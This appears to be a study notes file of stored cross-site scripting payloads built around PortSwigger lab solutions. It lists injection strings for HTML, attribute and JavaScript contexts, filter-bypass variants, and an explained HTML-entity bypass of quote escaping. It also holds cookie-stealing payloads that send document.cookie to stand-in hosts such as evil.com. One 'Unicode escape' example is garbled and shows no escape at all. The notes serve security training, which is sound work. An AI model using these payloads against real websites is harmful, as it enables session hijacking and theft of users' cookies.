# Stored XSS - Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: Stored XSS into href attribute
**Status**: SOLVED (Lab #16)
**Payload**: `javascript:alert(document.cookie)`

### Lab 2: Stored XSS into onclick event
**Payload**: 
```
'-'alert(document.cookie)-'
```
Or:
```
' onclick=alert(document.cookie) x='
```

### Lab 3: Stored XSS into anchor href with double quotes
**Payload**: `javascript:alert(document.cookie)`

### Lab 4: Stored XSS into angle brackets
**Payload**: `<script>alert(document.cookie)</script>`
Or if filtered: `<img src=x onerror=alert(document.cookie)>`

### Lab 5: Stored XSS into HTML context with nothing encoded
**Payload**: `<script>alert(document.cookie)</script>`

## Context-Specific Payloads

### HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

### Attribute Context (single quotes)
```
'-alert(1)-'
' onclick=alert(1) x='
```

### Attribute Context (double quotes)
```
"-alert(1)-"
" onclick=alert(1) x="
```

### JavaScript Context
```
'-alert(1)-'
";alert(1);//
</script><script>alert(1)</script>
```

### href Attribute
```
javascript:alert(1)
```

### onclick Event
```
'-alert(1)-'
```

## Bypass Filters

### When <script> is blocked
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
```

### When quotes are filtered
```
<img src=x onerror=alert(1)>
// No quotes needed
```

### When alert() is blocked
```
confirm(1)
prompt(1)
print()
document.location='https://evil/?c='+document.cookie
```

### Case bypass
```
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x oNeRrOr=alert(1)>
```

### Encoding bypass
```
&#x61;lert(1)  // HTML entity
alert(1)  // Unicode escape
```

## Cookie Stealing Payload
```html
<script>
fetch('https://evil.com/steal?c='+document.cookie);
</script>
```
Or:
```html
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

## Verified Lab Solution: onclick Event Handler XSS

**Lab #44** - SOLVED 2026-07-07

### Bypass: HTML Entity Encoding
**Problem**: Server escapes `'` to `\'` but not `&apos;` HTML entity

**Payload**: `http://x.com&apos;-alert(document.domain)-&apos;`

### How it works:
1. Server stores `&apos;` as-is (doesn't recognize as quote)
2. Browser HTML-decodes `&apos;` to `'` when processing onclick
3. Result: `tracker.track('http://x.com'-alert(document.domain)-'')`
4. Breaks out of string context, executes alert()

### Key Lesson
- HTML entities bypass server-side character escaping
- Browser decodes entities at render time, after server has processed
- Try `&apos;`, `&#39;`, `&#x27;` for single quotes
- Try `&quot;`, `&#34;`, `&#x22;` for double quotes
